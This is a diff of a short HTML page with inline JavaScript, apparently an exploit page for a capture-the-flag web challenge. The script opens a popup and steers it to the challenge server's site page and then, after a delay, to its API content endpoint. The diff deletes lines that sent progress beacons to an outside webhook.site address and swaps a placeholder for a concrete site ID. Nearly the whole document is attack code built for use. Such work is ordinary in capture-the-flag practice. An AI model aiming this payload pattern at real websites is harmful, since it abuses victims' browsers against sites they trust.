@@ -1,22 +1,15 @@
 <!doctype html>
 <meta charset="utf-8">
 <script>
-const hook = 'https://webhook.site/3bb19ee6-2a5a-47a2-8f05-516b47c0a700';
-const site = 'YOUR_SITE_ID';
-
-(new Image()).src = hook + '?s=controller_loaded';
+const chall = 'http://chal.polyuctf.com:43042';
+const id = 'a3b74a327a68434af4e108c8a9c986a44717a07219b3bd4b4aabf20b8d0c2724';
 
 const w = open('about:blank');
-(new Image()).src = hook + '?s=' + (w ? 'popup_ok' : 'popup_blocked');
-
 if (w) {
-  w.location = 'http://chal.polyuctf.com:43042/sites/' + site;
+  w.location = `${chall}/sites/${id}`;
 
   setTimeout(() => {
-    (new Image()).src = hook + '?s=to_api';
-    w.location = 'http://chal.polyuctf.com:43042/api/sites/' + site + '/content';
-  }, 7000);
+    w.location.replace(`${chall}/api/sites/${id}/content`);
+  }, 2500);
 }
 </script>
-
-
